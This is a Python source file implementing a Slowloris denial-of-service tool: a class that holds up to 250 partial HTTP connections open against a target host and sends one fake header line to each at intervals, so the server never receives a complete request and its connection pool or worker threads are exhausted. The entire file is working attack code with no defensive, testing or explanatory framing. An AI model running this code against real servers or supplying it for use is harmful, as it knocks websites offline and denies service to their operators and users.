import socket
import threading
import time


class SlowlorisAttack:
    """Opens partial HTTP connections and trickles header bytes to exhaust the
    target's connection pool / worker threads."""

    def __init__(self, target, port=80, max_conn=250, trickle_interval=10.0, on_heartbeat=None):
        self.target = target
        self.port = port
        self.max_conn = max_conn
        self.trickle_interval = trickle_interval
        self.on_heartbeat = on_heartbeat
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._sockets = []
        self.thread = None

    @property
    def is_running(self):
        return not self._stop.is_set()

    def start(self):
        self._stop.clear()
        self.thread = threading.Thread(target=self._keeper, daemon=True, name=f"slow-{self.target}")
        self.thread.start()

    def stop(self):
        self._stop.set()
        with self._lock:
            for s in self._sockets:
                try:
                    s.close()
                except OSError:
                    pass
            self._sockets.clear()

    def connection_count(self):
        with self._lock:
            return len(self._sockets)

    def _open_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((self.target, self.port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {self.target}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n")
        s.send(b"Accept: */*\r\n")
        with self._lock:
            self._sockets.append(s)

    def _prune(self):
        alive = []
        with self._lock:
            for s in self._sockets:
                try:
                    if s.fileno() != -1:
                        alive.append(s)
                except (OSError, ValueError):
                    pass
            self._sockets = alive
        return len(alive)

    def _keeper(self):
        last_beat = 0.0
        while not self._stop.is_set():
            # top up connections
            need = self.max_conn - self._prune()
            for _ in range(min(need, 40)):
                if self._stop.is_set():
                    break
                try:
                    self._open_connection()
                except Exception:
                    time.sleep(0.02)

            # trickle one header line to every open socket so the server never
            # sees a timeout and never gets the terminating \r\n\r\n
            with self._lock:
                for s in self._sockets:
                    try:
                        s.send(b"X-a: b\r\n")
                    except OSError:
                        try:
                            s.close()
                        except OSError:
                            pass
            self._prune()

            if self.on_heartbeat and time.time() - last_beat >= 30:
                last_beat = time.time()
                try:
                    self.on_heartbeat(self.connection_count())
                except Exception:
                    pass

            time.sleep(self.trickle_interval)
        self.stop()
